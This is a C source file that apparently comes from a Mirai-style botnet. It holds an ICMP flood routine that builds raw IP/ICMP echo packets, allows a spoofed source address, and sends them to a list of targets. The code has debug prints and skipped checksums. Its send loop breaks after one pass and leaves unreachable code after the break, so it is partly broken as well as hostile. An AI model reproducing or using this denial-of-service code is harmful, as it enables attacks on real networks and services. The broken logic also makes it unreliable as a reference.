#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <fcntl.h>
#include <errno.h>
#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"

void attack_icmp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    printf("[ATTACK] Initiating ICMP attack ...\n");

    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1)
    {
        perror("Reason of the error");
        printf("Failed to create raw socket. Aborting attack\n");
        return;
    }
    
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        printf("Failed to set IP_HDRINCL. Aborting\n");
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct icmphdr *icmph;
        int pktsize = sizeof (struct iphdr) + sizeof (struct icmphdr) + 32;

        pkts[i] = calloc(pktsize, sizeof (char));

        iph = (struct iphdr *)pkts[i];
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = pktsize;
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_ICMP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        iph->check = 0;
        
        icmph = (struct icmphdr *)(pkts[i] + sizeof(struct iphdr));
        icmph->type = 8;
        icmph->code = 0;
        icmph->un.echo.sequence = rand();
        icmph->un.echo.id = getpid()*4+rand();
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];

            printf("[ICMP] Sending message ...\n");
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct icmphdr) + 32, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
        printf("[ICMP] Attack Finished\n");
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
    }
}